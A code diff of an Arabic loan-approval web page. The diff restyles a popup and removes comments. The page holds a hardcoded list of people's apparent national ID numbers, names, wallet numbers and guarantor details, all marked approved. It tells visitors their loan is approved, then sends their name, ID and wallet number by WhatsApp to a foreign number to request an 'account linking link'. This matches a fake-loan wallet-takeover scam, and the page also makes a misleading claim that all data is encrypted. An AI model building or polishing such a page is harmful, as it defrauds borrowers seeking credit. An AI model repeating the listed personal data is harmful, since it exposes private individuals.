@@ -69,7 +69,7 @@
         .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #ff5e5e; border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; margin-top: 1rem; }
         .loader { text-align: center; display: none; margin: 1rem; }
         
-        /* نافذة واتساب المحترفة */
+        /* نافذة منبثقة صغيرة محسنة */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -90,93 +90,104 @@
         }
         .modal-container {
             background: linear-gradient(145deg, #1A1F2E, #0E1220);
-            border-radius: 2rem;
-            max-width: 550px;
+            border-radius: 1.5rem;
+            max-width: 460px;
             width: 90%;
             border: 1px solid var(--success-green);
-            box-shadow: 0 0 40px rgba(0,200,83,0.4);
-            animation: modalSlideUp 0.4s ease;
+            box-shadow: 0 0 30px rgba(0,200,83,0.3);
+            animation: modalSlideUp 0.3s ease;
             direction: rtl;
+            overflow: hidden;
         }
         @keyframes modalSlideUp {
-            from { transform: translateY(50px); opacity: 0; }
+            from { transform: translateY(30px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
         .modal-header {
             background: linear-gradient(135deg, #00C85320, #00E5FF20);
-            padding: 1.2rem;
+            padding: 0.8rem 1rem;
             border-bottom: 1px solid var(--success-green);
             text-align: center;
-            border-radius: 2rem 2rem 0 0;
         }
         .modal-header h3 {
-            font-size: 1.6rem;
+            font-size: 1.3rem;
             color: var(--success-green);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 0.8rem;
+            gap: 0.5rem;
+            margin: 0;
         }
         .modal-body {
-            padding: 1.5rem;
+            padding: 1rem;
             text-align: center;
         }
         .client-info-modal {
             background: rgba(0,0,0,0.5);
-            border-radius: 1.2rem;
-            padding: 1rem;
-            margin: 1rem 0;
+            border-radius: 1rem;
+            padding: 0.6rem;
+            margin: 0.8rem 0;
             text-align: right;
+            font-size: 0.85rem;
         }
         .client-info-modal p {
-            margin: 0.5rem 0;
-            font-size: 1rem;
+            margin: 0.3rem 0;
+            font-size: 0.85rem;
         }
         .client-info-modal span {
             color: var(--accent-gold);
             font-weight: bold;
         }
         .modal-footer {
-            padding: 1.2rem;
+            padding: 0.8rem 1rem 1rem;
             border-top: 1px solid rgba(0,200,83,0.3);
             text-align: center;
         }
         .btn-link-transfer {
             background: linear-gradient(135deg, #25D366, #128C7E);
             border: none;
-            padding: 0.9rem 1.8rem;
-            border-radius: 3rem;
+            padding: 0.7rem 1rem;
+            border-radius: 2.5rem;
             font-weight: bold;
-            font-size: 1.1rem;
+            font-size: 1rem;
             cursor: pointer;
             display: inline-flex;
             align-items: center;
-            gap: 0.8rem;
+            justify-content: center;
+            gap: 0.6rem;
             transition: 0.2s;
             color: white;
-            text-decoration: none;
             width: 100%;
-            justify-content: center;
+            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
         }
         .btn-link-transfer:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px #25D366;
+            transform: scale(1.01);
+            box-shadow: 0 0 15px #25D366;
         }
         .close-modal-btn {
             background: transparent;
             border: none;
             color: var(--text-muted);
-            font-size: 1.2rem;
-            margin-top: 1rem;
+            font-size: 0.85rem;
+            margin-top: 0.7rem;
             cursor: pointer;
+            display: inline-block;
         }
         .whatsapp-note {
             background: rgba(37, 211, 102, 0.15);
-            border-radius: 1rem;
-            padding: 0.5rem;
-            font-size: 0.85rem;
-            margin-top: 0.8rem;
+            border-radius: 0.8rem;
+            padding: 0.4rem;
+            font-size: 0.75rem;
+            margin-top: 0.5rem;
             color: #a0f0b0;
+        }
+        /* تحسين النصوص داخل المودال */
+        .modal-body p {
+            font-size: 0.9rem;
+            margin-bottom: 0.2rem;
+        }
+        .modal-body strong {
+            color: var(--accent-gold);
         }
     </style>
 </head>
@@ -196,29 +207,29 @@
     </div>
     <div class="result-card" id="resultCard"></div>
     <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل في النظام. يرجى التأكد من صحة الرقم.</p></div>
-    <div class="footer-info"><i class="fab fa-whatsapp"></i> سيتم توجيهك إلى خدمة التحويلات المالية على واتساب لإنهاء الإجراءات | جميع البيانات مشفرة SSL</div>
+    <div class="footer-info"><i class="fab fa-whatsapp"></i> سيتم توجيهك إلى خدمة التحويلات المالية على واتساب لإنهاء الإجراءات | جميع البيانات مشفرة</div>
 </div>
 
-<!-- النافذة المنبثقة للتوجيه إلى واتساب مع الرسالة المخصصة -->
+<!-- نافذة منبثقة صغيرة الحجم (Compact) -->
 <div class="modal-overlay" id="redirectModal">
     <div class="modal-container">
         <div class="modal-header">
-            <h3><i class="fab fa-whatsapp"></i> 🎉 تمويلك معتمد 🎉</h3>
+            <h3><i class="fab fa-whatsapp"></i> تمويلك معتمد!</h3>
         </div>
         <div class="modal-body">
-            <p style="font-size: 1.1rem;">تهانينا! تمت الموافقة النهائية على طلب التمويل.</p>
+            <p style="font-weight:500;">✔️ تهانينا! تمت الموافقة النهائية.</p>
             <div class="client-info-modal" id="modalClientInfo">
-                <!-- سيتم ملؤها بواسطة JS -->
+                <!-- تملأ بيانات العميل ديناميكياً -->
             </div>
-            <p><strong>📲 خطوة أخيرة:</strong> سيتم توجيهك إلى خدمة التحويلات المالية عبر واتساب.</p>
-            <p>سيتم إرسال رسالة تحتوي على بياناتك (الاسم، الرقم القومي، نوع المحفظة) لطلب <strong>رابط ربط الحساب</strong> وإتمام صرف القرض فوراً.</p>
+            <p><strong>📲 خطوة واحدة:</strong> اضغط الزر للوصول إلى خدمة التحويلات المالية عبر واتساب.</p>
+            <p style="font-size:0.8rem;">سيتم إرسال بياناتك لطلب <strong>رابط ربط الحساب</strong> وإتمام الصرف فوراً.</p>
             <div class="whatsapp-note">
-                <i class="fab fa-whatsapp"></i> اضغط على الزر لفتح محادثة واتساب مع قسم التحويلات المالية
+                <i class="fab fa-whatsapp"></i> سيفتح الواتساب برسالة جاهزة تتضمن اسمك ورقمك القومي ونوع المحفظة.
             </div>
         </div>
         <div class="modal-footer">
             <button class="btn-link-transfer" id="confirmRedirectBtn">
-                <i class="fab fa-whatsapp"></i> اذهب إلى واتساب لصرف القرض وانهاء الإجراءات
+                <i class="fab fa-whatsapp"></i> صرف القرض عبر واتساب
             </button>
             <button class="close-modal-btn" onclick="closeModal()"><i class="fas fa-times-circle"></i> تذكر لاحقاً</button>
         </div>
@@ -226,7 +237,7 @@
 </div>
 
 <script>
-    // ***** قاعدة العملاء (جميع الطلبات موافقة) مع كامل البيانات *****
+    // ***** قاعدة العملاء (جميع الطلبات موافقة) *****
     const clientsData = [
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
         { id:"29409010209751", name:"انس محمد حسين محمد", job:"موظف قطاع خاص", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01009031820", guarantorRelation:"زوجة", guarantorName:"اسراء سالم الكيلاني سالم", guarantorId:"29909010206445", guarantorPhone:"01044288513", reason:"للسفر", otherLoans:"نعم", status:"approved" },
@@ -255,9 +266,6 @@
     let modalTimeout = null;
     const WHATSAPP_NUMBER = "573102608283";  // رقم واتساب قسم التحويلات المالية
 
-    function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
-
-    // بناء واجهة الموافقة التفصيلية
     function buildApprovalHTML(client) {
         return `
             <div class="approval-header">
@@ -291,23 +299,21 @@
                     </table>
                 </div>
             </div>
-            <div style="background: rgba(0,200,83,0.1); border-radius: 1.2rem; padding: 1rem; text-align: center; border: 1px dashed var(--success-green);">
-                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب خلال 5 ثوانٍ لطلب رابط ربط الحساب واستلام التمويل.
+            <div style="background: rgba(0,200,83,0.1); border-radius: 1.2rem; padding: 0.8rem; text-align: center; border: 1px dashed var(--success-green);">
+                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب خلال 5 ثوانٍ لطلب رابط ربط الحساب.
             </div>
         `;
     }
 
-    // عرض النافذة المنبثقة بالموافقة والبيانات
     function showApprovalModal(client) {
         const modal = document.getElementById('redirectModal');
         const modalInfoDiv = document.getElementById('modalClientInfo');
-        // تعبئة بيانات العميل في المودال (الاسم، الرقم القومي، المحفظة، المبلغ)
         modalInfoDiv.innerHTML = `
             <p><i class="fas fa-user"></i> <span>الاسم:</span> ${client.name}</p>
             <p><i class="fas fa-id-card"></i> <span>الرقم القومي:</span> ${client.id}</p>
             <p><i class="fas fa-wallet"></i> <span>نوع المحفظة:</span> ${client.wallet}</p>
             <p><i class="fas fa-mobile-alt"></i> <span>رقم المحفظة:</span> ${client.walletNum || "غير مسجل"}</p>
-            <p><i class="fas fa-money-bill-wave"></i> <span>المبلغ المعتمد:</span> ${client.loanRaw} ج.م</p>
+            <p><i class="fas fa-money-bill-wave"></i> <span>المبلغ:</span> ${client.loanRaw} ج.م</p>
         `;
         modal.style.display = 'flex';
     }
@@ -318,12 +324,8 @@
         if (modalTimeout) clearTimeout(modalTimeout);
     }
 
-    /**
-     * إرسال رسالة واتساب إلى رقم التحويلات المالية.
-     * تحتوي الرسالة على اسم العميل، الرقم القومي، نوع المحفظة، وطلب رابط ربط الحساب.
-     */
+    // إرسال رسالة واتساب مع البيانات المطلوبة
     function sendToWhatsApp(client) {
-        // بناء الرسالة بالصيغة المطلوبة: اسم العميل، الرقم القومي، نوع المحفظة، طلب رابط ربط الحساب
         const walletType = client.wallet || "غير محدد";
         const walletNumber = client.walletNum || "غير مسجل";
         const message = `مرحباً، أريد رابط ربط الحساب لإنهاء إجراءات صرف القرض.
@@ -335,14 +337,9 @@
 المبلغ المطلوب: ${client.loanRaw} ج.م
 يرجى إرسال رابط ربط الحساب لإتمام صرف التمويل.`;
         
-        // ترميز الرسالة (encodeURIComponent)
         const encodedMsg = encodeURIComponent(message);
         const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMsg}`;
-        
-        // فتح الواتساب في نافذة جديدة
         window.open(whatsappUrl, '_blank');
-        
-        // إغلاق المودال بعد التوجيه (اختياري)
         closeModal();
     }
 
@@ -352,9 +349,7 @@
         resultDiv.classList.add('show');
         document.getElementById('errorCard').style.display = 'none';
         
-        // إزالة أي مؤقت سابق
         if (modalTimeout) clearTimeout(modalTimeout);
-        // بعد 5 ثوانٍ من ظهور الموافقة، يتم عرض الإشعار المنبثق لتوجيه واتساب
         modalTimeout = setTimeout(() => {
             showApprovalModal(client);
         }, 5000);
@@ -385,7 +380,6 @@
         }, 800);
     }
 
-    // إضافة مستمع لزر التوجيه في المودال (واتساب)
     document.addEventListener('click', function(e) {
         if (e.target && e.target.id === 'confirmRedirectBtn') {
             if (currentClient) {
@@ -396,10 +390,8 @@
         }
     });
 
-    // دعم مفتاح Enter
     document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
     
-    // إغلاق المودال عند الضغط خارج المحتوى
     window.onclick = function(event) {
         const modal = document.getElementById('redirectModal');
         if (event.target === modal) {
